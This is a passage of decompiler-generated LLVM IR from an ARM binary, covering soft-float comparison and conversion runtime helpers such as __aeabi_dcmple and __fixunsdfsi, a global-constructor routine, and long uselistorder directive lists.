296, 297, 14, 298, 345, 346, 347, 348, 136, 15, 137, 138, 139, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 140, 16, 141, 142, 143, 144, 145, 17, 254, 255, 256, 18, 252, 253, 62, 63, 64, 257, 258, 259, 146, 147, 28, 148, 149, 19, 150, 151, 152, 153, 154, 155, 26, 156, 157, 158, 159, 29, 163, 20, 164, 165, 166, 167, 168, 169, 170, 171, 6, 172, 173, 174, 175, 176, 177, 37, 38, 160, 2, 161, 162, 21, 83, 84, 85, 54, 53, 24, 349, 350, 260, 261, 262, 263, 22, 264, 265, 178, 179, 180, 181, 182, 183, 245, 246, 247, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 344, 75, 76, 77, 78, 79, 80, 81, 82, 31, 32, 33, 34, 35, 36, 293, 294, 295 }
  uselistorder i32 %arg4, { 3, 2, 9, 8, 7, 6, 5, 0, 1, 4, 10 }
  uselistorder i32 %arg3, { 0, 1, 9, 8, 2, 11, 10, 3, 4, 7, 5, 6, 12 }
  uselistorder label %bb115, { 1, 0 }
  uselistorder label %dec_label_pc_1a7e4, { 1, 0 }
  uselistorder label %dec_label_pc_1a7c8, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %dec_label_pc_1a794, { 3, 2, 1, 0 }
  uselistorder label %bb109, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1a68c, { 1, 0 }
  uselistorder label %dec_label_pc_1a674, { 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_1a808 = call i32 @function_1a818()
  ret i32 %v0_1a808
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_1a810 = call i32 @function_1a818()
  ret i32 %v0_1a810

; uselistorder directives
  uselistorder i32 ()* @function_1a818, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_1a814 = load i32, i32* @r0, align 4
  ret i32 %v0_1a814
}

define i32 @function_1a818() local_unnamed_addr {
dec_label_pc_1a818:
  %v0_1a818 = load i32, i32* @ip, align 4
  %v0_1a81c = load i32, i32* @r0, align 4
  %v2_1a81c = mul i32 %v0_1a81c, 2
  %v2_1a81c.off = add i32 %v2_1a81c, 4194303
  %tmp = icmp ult i32 %v2_1a81c.off, 2097152
  %v0_1a824 = load i32, i32* @r2, align 4
  %v2_1a824 = mul i32 %v0_1a824, 2
  br i1 %tmp, label %dec_label_pc_1a874, label %bb

bb:                                               ; preds = %dec_label_pc_1a818
  %v2_1a824.off = add i32 %v2_1a824, 4194303
  %tmp26 = icmp ult i32 %v2_1a824.off, 2097152
  br i1 %tmp26, label %dec_label_pc_1a868, label %dec_label_pc_1a830

dec_label_pc_1a830:                               ; preds = %dec_label_pc_1a87c, %dec_label_pc_1a888, %bb
  %v0_1a830 = load i32, i32* @r1, align 4
  %v4_1a830 = or i32 %v0_1a830, %v2_1a81c
  %v6_1a830 = icmp eq i32 %v4_1a830, 0
  br i1 %v6_1a830, label %bb14, label %.thread

bb14:                                             ; preds = %dec_label_pc_1a830
  %v1_1a834 = load i32, i32* @r3, align 4
  %v5_1a834 = or i32 %v1_1a834, %v2_1a824
  %v7_1a834 = icmp eq i32 %v5_1a834, 0
  br i1 %v7_1a834, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_1a830, %bb14
  %v3_1a838 = xor i32 %v0_1a824, %v0_1a81c
  %v5_1a838 = icmp eq i32 %v3_1a838, 0
  br i1 %v5_1a838, label %.thread..thread1_crit_edge, label %.thread2.thread

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_1a83c.pre = load i32, i32* @r3, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb14
  %v2_1a83c = phi i32 [ %v2_1a83c.pre, %.thread..thread1_crit_edge ], [ %v1_1a834, %bb14 ]
  %v5_1a83c = icmp eq i32 %v2_1a83c, %v0_1a830
  br i1 %v5_1a83c, label %bb15, label %.thread1..thread2.thread_crit_edge

.thread1..thread2.thread_crit_edge:               ; preds = %.thread1
  %.pre24 = xor i32 %v0_1a824, %v0_1a81c
  br label %.thread2.thread

bb15:                                             ; preds = %.thread1
  ret i32 0

.thread2.thread:                                  ; preds = %.thread1..thread2.thread_crit_edge, %.thread
  %v2_1a84c.pre-phi = phi i32 [ %.pre24, %.thread1..thread2.thread_crit_edge ], [ %v3_1a838, %.thread ]
  %v3_1a84c = icmp slt i32 %v2_1a84c.pre-phi, 0
  br i1 %v3_1a84c, label %..thread7_crit_edge, label %bb16

bb16:                                             ; preds = %.thread2.thread
  %v10_1a850 = icmp eq i32 %v0_1a81c, %v0_1a824
  br i1 %v10_1a850, label %bb17, label %bb18

bb17:                                             ; preds = %bb16
  %v2_1a854 = load i32, i32* @r3, align 4
  %v4_1a854 = icmp ult i32 %v0_1a830, %v2_1a854
  br i1 %v4_1a854, label %..thread7_crit_edge, label %bb19

bb18:                                             ; preds = %bb16
  %v4_1a850 = icmp ult i32 %v0_1a81c, %v0_1a824
  br i1 %v4_1a850, label %..thread7_crit_edge, label %bb19

..thread7_crit_edge:                              ; preds = %bb17, %bb18, %.thread2.thread
  %.pre12 = ashr i32 %v0_1a824, 31
  br label %.thread7

bb19:                                             ; preds = %bb17, %bb18
  %v2_1a858 = and i32 %v0_1a824, 1073741824
  %v3_1a858 = icmp eq i32 %v2_1a858, 0
  %v4_1a858 = ashr i32 %v0_1a824, 31
  br i1 %v3_1a858, label %.thread7, label %bb20

.thread7:                                         ; preds = %bb19, %..thread7_crit_edge
  %v4_1a85c.pre-phi = phi i32 [ %.pre12, %..thread7_crit_edge ], [ %v4_1a858, %bb19 ]
  %v5_1a85c = sub nsw i32 -1, %v4_1a85c.pre-phi
  br label %bb20

bb20:                                             ; preds = %bb19, %.thread7
  %v0_1a860 = phi i32 [ %v4_1a858, %bb19 ], [ %v5_1a85c, %.thread7 ]
  %v1_1a860 = or i32 %v0_1a860, 1
  ret i32 %v1_1a860

dec_label_pc_1a868:                               ; preds = %bb
  br label %dec_label_pc_1a87c

dec_label_pc_1a874:                               ; preds = %dec_label_pc_1a818
  %v0_1a874 = load i32, i32* @r1, align 4
  %v4_1a874 = mul i32 %v0_1a81c, 4096
  %v5_1a874 = or i32 %v0_1a874, %v4_1a874
  %v7_1a874 = icmp eq i32 %v5_1a874, 0
  br i1 %v7_1a874, label %dec_label_pc_1a874.dec_label_pc_1a87c_crit_edge, label %dec_label_pc_1a890

dec_label_pc_1a874.dec_label_pc_1a87c_crit_edge:  ; preds = %dec_label_pc_1a874
  %v2_1a824.off25 = add i32 %v2_1a824, 4194303
  %tmp27 = icmp ult i32 %v2_1a824.off25, 2097152
  br label %dec_label_pc_1a87c

dec_label_pc_1a87c:                               ; preds = %dec_label_pc_1a874.dec_label_pc_1a87c_crit_edge, %dec_label_pc_1a868
  %v3_1a880.pre-phi = phi i1 [ %tmp27, %dec_label_pc_1a874.dec_label_pc_1a87c_crit_edge ], [ true, %dec_label_pc_1a868 ]
  br i1 %v3_1a880.pre-phi, label %dec_label_pc_1a888, label %dec_label_pc_1a830

dec_label_pc_1a888:                               ; preds = %dec_label_pc_1a87c
  %v0_1a888 = load i32, i32* @r3, align 4
  %v4_1a888 = mul i32 %v0_1a824, 4096
  %v5_1a888 = or i32 %v0_1a888, %v4_1a888
  %v7_1a888 = icmp eq i32 %v5_1a888, 0
  br i1 %v7_1a888, label %dec_label_pc_1a830, label %dec_label_pc_1a890

dec_label_pc_1a890:                               ; preds = %dec_label_pc_1a874, %dec_label_pc_1a888
  ret i32 %v0_1a818

; uselistorder directives
  uselistorder i32 %v4_1a858, { 1, 0 }
  uselistorder i32 %v1_1a834, { 1, 0 }
  uselistorder i32 %v0_1a830, { 2, 0, 1 }
  uselistorder i32 %v2_1a824, { 0, 2, 1 }
  uselistorder i32 %v0_1a824, { 0, 5, 6, 4, 8, 7, 2, 3, 1 }
  uselistorder i32 %v2_1a81c, { 1, 0 }
  uselistorder i32 %v0_1a81c, { 0, 4, 5, 2, 3, 1 }
  uselistorder i32 1073741824, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 31, { 17, 7, 5, 12, 14, 18, 6, 22, 15, 4, 19, 2, 1, 0, 8, 10, 9, 11, 3, 20, 21, 16, 13, 23 }
  uselistorder i32* @r3, { 6, 7, 1, 8, 9, 10, 0, 11, 3, 12, 21, 2, 22, 23, 13, 14, 24, 15, 16, 17, 18, 4, 5, 27, 30, 28, 29, 25, 19, 20, 26, 31 }
  uselistorder i32* @r1, { 77, 78, 13, 79, 80, 81, 82, 83, 84, 14, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 29, 15, 30, 96, 31, 0, 4, 97, 12, 98, 99, 100, 101, 11, 102, 103, 104, 147, 148, 2, 149, 150, 151, 154, 152, 153, 16, 17, 32, 155, 156, 157, 158, 159, 160, 161, 162, 5, 163, 164, 105, 165, 166, 167, 168, 171, 174, 175, 176, 177, 178, 179, 6, 136, 137, 19, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 8, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 7, 251, 252, 18, 169, 170, 106, 107, 108, 109, 110, 111, 112, 113, 114, 21, 26, 27, 253, 3, 254, 128, 129, 193, 42, 43, 256, 194, 199, 200, 203, 201, 202, 195, 196, 197, 198, 33, 255, 130, 22, 180, 186, 190, 189, 257, 258, 259, 115, 116, 117, 23, 191, 24, 118, 181, 182, 183, 184, 185, 9, 131, 132, 10, 20, 119, 120, 121, 1, 122, 123, 124, 25, 172, 173, 125, 126, 28, 34, 35, 36, 37, 38, 39, 40, 41, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 127, 133, 134, 135, 138, 139, 140, 141, 142, 143, 144, 145, 146, 187, 188, 192, 204 }
  uselistorder i32* @ip, { 15, 16, 17, 6, 18, 19, 20, 21, 22, 23, 24, 25, 26, 3, 27, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 7, 8, 0, 9, 10, 11, 12, 13, 36, 37, 5, 38, 4, 39, 30, 31, 2, 32, 33, 29, 34, 91, 88, 89, 90, 1, 92, 14, 28, 35, 42, 41, 40, 43, 44 }
  uselistorder label %dec_label_pc_1a890, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %..thread7_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1a830, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_1a898 = load i32, i32* @r0, align 4
  %v0_1a89c = load i32, i32* @r2, align 4
  store i32 %v0_1a89c, i32* @r0, align 4
  store i32 %v0_1a898, i32* @r2, align 4
  %v0_1a8b0 = call i32 @__aeabi_cdcmple()
  ret i32 %v0_1a8b0
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_1a8b4 = load i32, i32* @r0, align 4
  %v1_1a8b8 = sext i32 %v3_1a8b4 to i64
  %v2_1a8b8 = bitcast i64 %v1_1a8b8 to double
  %v3_1a8b8 = load i32, i32* @r2, align 4
  %v4_1a8b8 = sext i32 %v3_1a8b8 to i64
  %v5_1a8b8 = bitcast i64 %v4_1a8b8 to double
  %v7_1a8b8 = fcmp oeq double %v2_1a8b8, %v5_1a8b8
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_1a8b8 = fcmp ule double %v2_1a8b8, %v5_1a8b8
  %not.v7_1a8b8 = xor i1 %v7_1a8b8, true
  %v1_1a8bc = and i1 %not.v6_1a8b8, %not.v7_1a8b8
  store i1 %v7_1a8b8, i1* @cpsr_z, align 1
  br i1 %v1_1a8bc, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_1a8b8, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_1a8b4

; uselistorder directives
  uselistorder i1 %v7_1a8b8, { 1, 2, 0 }
  uselistorder i32* @r2, { 16, 26, 27, 56, 57, 58, 10, 59, 60, 61, 62, 63, 101, 102, 11, 103, 104, 105, 106, 12, 28, 29, 30, 107, 108, 109, 110, 13, 64, 111, 120, 121, 122, 123, 89, 14, 7, 156, 157, 158, 159, 65, 66, 3, 67, 68, 69, 113, 114, 8, 70, 17, 18, 160, 4, 161, 167, 168, 172, 162, 142, 42, 43, 44, 45, 46, 163, 144, 148, 149, 152, 150, 151, 145, 146, 147, 32, 86, 87, 1, 88, 141, 15, 124, 169, 90, 71, 72, 73, 112, 2, 170, 6, 171, 74, 75, 76, 77, 9, 78, 79, 5, 80, 0, 81, 115, 116, 117, 118, 82, 83, 119, 19, 20, 31, 164, 165, 166, 33, 34, 35, 36, 37, 38, 39, 40, 41, 47, 48, 49, 50, 51, 52, 53, 54, 55, 84, 85, 91, 92, 93, 94, 95, 96, 97, 98, 21, 22, 23, 24, 25, 99, 100, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 143, 153, 154, 155 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq() local_unnamed_addr {
entry:
  %v0_1a8c8 = load i32, i32* @lr, align 4
  %v0_1a8cc = call i32 @__aeabi_cdcmple()
  %v0_1a8d0 = load i1, i1* @cpsr_z, align 1
  %.v0_1a8cc. = zext i1 %v0_1a8d0 to i32
  call void @__pseudo_branch(i32 %v0_1a8c8)
  ret i32 %.v0_1a8cc.
}

define i32 @__aeabi_dcmplt() local_unnamed_addr {
entry:
  %v0_1a8dc = load i32, i32* @lr, align 4
  %v0_1a8e0 = call i32 @__aeabi_cdcmple()
  %v0_1a8e4 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1a8e4 to i32
  %.v0_1a8e0. = xor i32 %tmp2, 1
  call void @__pseudo_branch(i32 %v0_1a8dc)
  ret i32 %.v0_1a8e0.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_1a8f0 = load i32, i32* @lr, align 4
  store i32 %v0_1a8f0, i32* %stack_var_-8, align 4
  %v0_1a8f4 = call i32 @__aeabi_cdcmple()
  %v0_1a8f8 = load i1, i1* @cpsr_z, align 1
  %v1_1a8f8 = load i1, i1* @cpsr_c, align 1
  %v2_1a8f8 = xor i1 %v1_1a8f8, true
  %v3_1a8f8 = or i1 %v0_1a8f8, %v2_1a8f8
  %.v0_1a8f4 = select i1 %v3_1a8f8, i32 1, i32 %v0_1a8f4
  %v2_1a8fc = xor i1 %v0_1a8f8, true
  %v3_1a8fc = and i1 %v1_1a8f8, %v2_1a8fc
  %..v0_1a8f4 = select i1 %v3_1a8fc, i32 0, i32 %.v0_1a8f4
  %v2_1a900 = load i32, i32* %stack_var_-8, align 4
  call void @__pseudo_branch(i32 %v2_1a900)
  ret i32 %..v0_1a8f4

; uselistorder directives
  uselistorder i1 %v1_1a8f8, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_1a904 = load i32, i32* @lr, align 4
  store i32 %v0_1a904, i32* %stack_var_-8, align 4
  %v0_1a908 = call i32 @__aeabi_cdrcmple()
  %v0_1a90c = load i1, i1* @cpsr_z, align 1
  %v1_1a90c = load i1, i1* @cpsr_c, align 1
  %v2_1a90c = xor i1 %v1_1a90c, true
  %v3_1a90c = or i1 %v0_1a90c, %v2_1a90c
  %.v0_1a908 = select i1 %v3_1a90c, i32 1, i32 %v0_1a908
  %v2_1a910 = xor i1 %v0_1a90c, true
  %v3_1a910 = and i1 %v1_1a90c, %v2_1a910
  %..v0_1a908 = select i1 %v3_1a910, i32 0, i32 %.v0_1a908
  %v2_1a914 = load i32, i32* %stack_var_-8, align 4
  call void @__pseudo_branch(i32 %v2_1a914)
  ret i32 %..v0_1a908

; uselistorder directives
  uselistorder i1 %v1_1a90c, { 1, 0 }
  uselistorder i1 true, { 2, 3, 4, 5, 0, 69, 1, 6, 7, 8, 9, 59, 60, 65, 61, 62, 63, 66, 10, 11, 12, 56, 64, 13, 14, 16, 15, 17, 70, 67, 20, 21, 22, 23, 18, 19, 68, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 39, 40, 37, 38, 41, 42, 55, 71, 43, 44, 45, 57, 46, 47, 48, 49, 58, 50, 51, 52, 53, 54 }
  uselistorder i1* @cpsr_z, { 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 2, 24, 25, 27, 28, 29, 30, 31, 32, 33, 0, 34, 1, 3, 4, 26, 5, 6, 7, 8, 35 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_1a918 = load i32, i32* @lr, align 4
  %v0_1a91c = call i32 @__aeabi_cdrcmple()
  %v0_1a920 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1a920 to i32
  %.v0_1a91c. = xor i32 %tmp2, 1
  call void @__pseudo_branch(i32 %v0_1a918)
  ret i32 %.v0_1a91c.

; uselistorder directives
  uselistorder i1 false, { 44, 13, 14, 85, 86, 87, 88, 89, 90, 91, 92, 93, 0, 10, 45, 36, 46, 47, 48, 49, 50, 4, 94, 6, 51, 16, 52, 53, 54, 15, 55, 56, 58, 59, 60, 61, 62, 63, 64, 57, 17, 65, 28, 18, 29, 66, 67, 68, 20, 19, 11, 12, 69, 70, 71, 2, 3, 72, 30, 31, 73, 32, 33, 21, 39, 40, 7, 22, 74, 34, 35, 75, 76, 37, 38, 77, 78, 41, 42, 79, 80, 81, 82, 83, 84, 43, 95, 1, 25, 24, 26, 23, 8, 9, 27, 5, 96, 97, 98, 99 }
  uselistorder i32 ()* @__aeabi_cdrcmple, { 1, 0 }
  uselistorder i32* @lr, { 11, 12, 13, 14, 15, 8, 24, 25, 26, 27, 57, 59, 60, 61, 64, 65, 66, 3, 67, 68, 69, 70, 71, 54, 55, 56, 28, 29, 30, 31, 72, 79, 80, 81, 82, 83, 84, 85, 94, 33, 32, 0, 34, 35, 1, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 4, 113, 114, 115, 5, 116, 117, 118, 6, 119, 120, 121, 122, 123, 124, 125, 126, 75, 36, 37, 38, 7, 40, 41, 39, 95, 96, 97, 127, 58, 89, 128, 129, 130, 18, 19, 20, 21, 98, 99, 100, 131, 62, 63, 91, 92, 42, 43, 86, 87, 88, 93, 73, 22, 76, 77, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 2, 23, 74, 16, 17, 78, 90, 101, 102, 9, 10 }
}

define i32 @__fixunsdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1a92c = icmp slt i32 %arg1, 0
  %v2_1a92c = mul i32 %arg1, 2
  br i1 %v1_1a92c, label %dec_label_pc_1a960, label %dec_label_pc_1a934

dec_label_pc_1a934:                               ; preds = %entry
  %v1_1a934 = add i32 %v2_1a92c, 2097152
  %v2_1a934 = icmp ugt i32 %v2_1a92c, -2097153
  br i1 %v2_1a934, label %dec_label_pc_1a968, label %dec_label_pc_1a93c

dec_label_pc_1a93c:                               ; preds = %dec_label_pc_1a934
  %v6_1a934 = icmp slt i32 %v1_1a934, 0
  br i1 %v6_1a934, label %dec_label_pc_1a940, label %dec_label_pc_1a960

dec_label_pc_1a940:                               ; preds = %dec_label_pc_1a93c
  %v4_1a944 = sdiv i32 %v1_1a934, 2097152
  %v5_1a944 = sub nsw i32 -993, %v4_1a944
  %v11_1a944 = icmp slt i32 %v5_1a944, 0
  br i1 %v11_1a944, label %dec_label_pc_1a970, label %dec_label_pc_1a94c

dec_label_pc_1a94c:                               ; preds = %dec_label_pc_1a940
  %v3_1a94c = mul i32 %arg1, 2048
  %v4_1a954 = udiv i32 %arg2, 2097152
  %v1_1a950 = or i32 %v3_1a94c, %v4_1a954
  %v5_1a954 = or i32 %v1_1a950, -2147483648
  %v6_1a958 = lshr i32 %v5_1a954, %v5_1a944
  ret i32 %v6_1a958

dec_label_pc_1a960:                               ; preds = %dec_label_pc_1a93c, %entry
  ret i32 0

dec_label_pc_1a968:                               ; preds = %dec_label_pc_1a934
  %v4_1a968 = mul i32 %arg1, 4096
  %v5_1a968 = or i32 %v4_1a968, %arg2
  %v7_1a968 = icmp eq i32 %v5_1a968, 0
  br i1 %v7_1a968, label %dec_label_pc_1a970, label %dec_label_pc_1a978

dec_label_pc_1a970:                               ; preds = %dec_label_pc_1a968, %dec_label_pc_1a940
  ret i32 -1

dec_label_pc_1a978:                               ; preds = %dec_label_pc_1a968
  ret i32 0

; uselistorder directives
  uselistorder i32 4096, { 0, 1, 2, 3, 4, 23, 5, 6, 24, 7, 8, 9, 10, 25, 13, 14, 29, 17, 30, 15, 12, 26, 16, 18, 19, 27, 28, 20, 31, 21, 32, 11, 22 }
  uselistorder i32 -2147483648, { 0, 6, 1, 7, 8, 9, 10, 11, 12, 14, 13, 3, 5, 15, 16, 17, 18, 19, 4, 2, 20, 21, 22, 23 }
  uselistorder i32 2048, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 11, 12, 13, 9, 14, 15, 8 }
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
  uselistorder i32 2, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 173, 36, 37, 38, 163, 39, 40, 41, 42, 43, 82, 44, 198, 105, 106, 200, 154, 155, 199, 107, 201, 202, 203, 204, 205, 81, 122, 169, 45, 171, 170, 206, 207, 208, 46, 83, 84, 85, 86, 87, 88, 174, 175, 156, 157, 158, 47, 159, 89, 226, 227, 111, 228, 229, 92, 230, 91, 231, 90, 211, 176, 80, 177, 178, 48, 49, 179, 180, 123, 124, 187, 125, 188, 126, 189, 50, 93, 51, 160, 127, 190, 128, 191, 129, 192, 130, 193, 131, 194, 108, 172, 79, 52, 232, 109, 213, 53, 132, 214, 215, 54, 133, 216, 217, 119, 164, 0, 55, 56, 57, 134, 94, 96, 95, 97, 98, 99, 100, 113, 101, 114, 102, 103, 209, 210, 181, 182, 120, 58, 59, 60, 161, 61, 121, 183, 115, 112, 62, 184, 185, 186, 212, 63, 162, 1, 64, 65, 66, 67, 68, 69, 70, 71, 72, 165, 73, 74, 75, 76, 77, 135, 110, 136, 137, 138, 116, 195, 196, 139, 117, 140, 144, 166, 143, 167, 142, 141, 168, 153, 145, 197, 146, 147, 218, 219, 220, 221, 148, 222, 149, 150, 151, 225, 118, 223, 78, 224, 104, 152 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1a984 = load i32, i32* @global_var_2d000.1230, align 4
  %v7_1a988 = icmp eq i32 %v3_1a984, -1
  %v3_1a98c = load i32, i32* @r4, align 4
  store i32 %v3_1a98c, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_2d000.1230 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_1a988, label %bb, label %.preheader

bb:                                               ; preds = %entry
  store i32 %v3_1a98c, i32* %r4.global-to-local, align 4
  %v9_1a994 = load i32, i32* @r0, align 4
  ret i32 %v9_1a994

.preheader:                                       ; preds = %entry, %.preheader
  %v0_1a99c = phi i32 [ %v3_1a9a0, %.preheader ], [ %v3_1a984, %entry ]
  call void @__pseudo_branch(i32 %v0_1a99c)
  %v0_1a9a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a9a0 = add i32 %v0_1a9a0, -4
  %v2_1a9a0 = inttoptr i32 %v1_1a9a0 to i32*
  %v3_1a9a0 = load i32, i32* %v2_1a9a0, align 4
  store i32 %v1_1a9a0, i32* %r4.global-to-local, align 4
  %v3_1a9a4 = icmp eq i32 %v3_1a9a0, -1
  br i1 %v3_1a9a4, label %dec_label_pc_1a9ac, label %.preheader

dec_label_pc_1a9ac:                               ; preds = %.preheader
  %v2_1a9ac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1a9ac, i32* %r4.global-to-local, align 4
  %v8_1a9ac = load i32, i32* @r0, align 4
  ret i32 %v8_1a9ac

; uselistorder directives
  uselistorder i32 %v3_1a9a0, { 1, 0 }
  uselistorder i32 %v3_1a984, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 67, 17, 18, 19, 59, 20, 28, 68, 69, 70, 12, 29, 30, 31, 71, 72, 73, 13, 32, 33, 34, 74, 75, 76, 14, 35, 36, 77, 27, 26, 78, 79, 80, 25, 24, 23, 22, 37, 38, 39, 40, 41, 9, 42, 10, 43, 11, 81, 21, 44, 60, 0, 51, 52, 53, 54, 64, 55, 45, 46, 56, 57, 58, 65, 66, 47, 16, 15, 61, 62, 63, 48, 49, 1, 50, 3, 4, 5, 6, 7, 8, 2 }
  uselistorder i32 -1, {}
  uselistorder i32* @global_var_2d000.1230, { 1, 0 }
  uselistorder i32 1, { 576, 250, 464, 483, 577, 484, 578, 465, 946, 947, 948, 579, 163, 167, 166, 164, 165, 162, 169, 168, 949, 245, 950, 581, 580, 103, 104, 108, 105, 102, 106, 107, 109, 308, 307, 309, 433, 951, 952, 52, 53, 953, 389, 388, 390, 582, 179, 180, 176, 175, 178, 177, 1046, 391, 1047, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 583, 315, 316, 314, 311, 310, 312, 313, 1060, 493, 1061, 1062, 584, 123, 122, 124, 121, 127, 125, 126, 1063, 114, 1064, 434, 1065, 1070, 1071, 470, 1072, 1073, 1074, 494, 495, 1075, 1076, 585, 317, 318, 322, 319, 321, 320, 586, 1077, 587, 215, 214, 213, 216, 1078, 588, 217, 218, 1079, 1080, 1081, 1082, 589, 170, 171, 905, 906, 907, 908, 909, 910, 911, 912, 913, 592, 591, 590, 197, 198, 199, 914, 915, 916, 917, 918, 596, 595, 594, 593, 92, 91, 97, 93, 96, 95, 94, 98, 99, 90, 100, 435, 1083, 1084, 436, 1085, 1086, 1087, 1088, 1089, 496, 1090, 1091, 1092, 1093, 1094, 598, 597, 138, 136, 140, 137, 141, 142, 143, 135, 139, 408, 1099, 1095, 1096, 1097, 1098, 456, 599, 173, 174, 172, 1100, 600, 1024, 1025, 1026, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 601, 243, 244, 237, 238, 239, 240, 242, 241, 416, 156, 1116, 1117, 1118, 1119, 1120, 1121, 602, 324, 325, 326, 323, 603, 89, 417, 497, 954, 604, 160, 158, 157, 161, 159, 1122, 1123, 498, 605, 21, 22, 19, 23, 18, 20, 955, 956, 607, 606, 328, 330, 329, 327, 331, 608, 101, 1130, 437, 1129, 418, 396, 1132, 438, 1131, 0, 1135, 1136, 1137, 1138, 611, 610, 609, 275, 276, 1177, 1178, 1179, 1180, 1181, 471, 1182, 1183, 472, 1185, 499, 1186, 466, 467, 475, 1, 473, 474, 1187, 1184, 500, 1188, 460, 618, 617, 561, 616, 615, 562, 614, 613, 612, 409, 459, 1257, 1258, 1259, 1260, 1261, 439, 619, 120, 1027, 1028, 1029, 620, 334, 335, 333, 332, 957, 419, 958, 1300, 420, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 1311, 1312, 563, 622, 621, 12, 13, 14, 15, 10, 9, 8, 11, 17, 16, 501, 1139, 1140, 1155, 1156, 1157, 1158, 623, 564, 273, 272, 274, 423, 440, 959, 502, 960, 961, 503, 405, 441, 402, 421, 422, 962, 504, 963, 964, 965, 966, 442, 967, 392, 968, 969, 505, 970, 971, 574, 575, 637, 636, 635, 634, 633, 632, 631, 630, 629, 628, 627, 626, 625, 565, 624, 86, 73, 74, 78, 81, 75, 76, 82, 77, 80, 87, 72, 79, 83, 85, 84, 1233, 1234, 566, 638, 61, 59, 64, 66, 62, 63, 60, 65, 972, 973, 974, 975, 403, 976, 977, 978, 639, 153, 154, 151, 155, 152, 979, 980, 640, 229, 1141, 1142, 1143, 1144, 1145, 270, 269, 266, 268, 265, 264, 271, 267, 981, 642, 641, 144, 145, 147, 146, 443, 476, 645, 644, 643, 646, 336, 647, 148, 149, 648, 58, 649, 337, 650, 150, 651, 338, 652, 339, 653, 340, 654, 224, 655, 2, 659, 658, 657, 656, 193, 194, 506, 660, 444, 507, 661, 192, 662, 663, 1017, 668, 667, 666, 665, 664, 207, 208, 211, 210, 209, 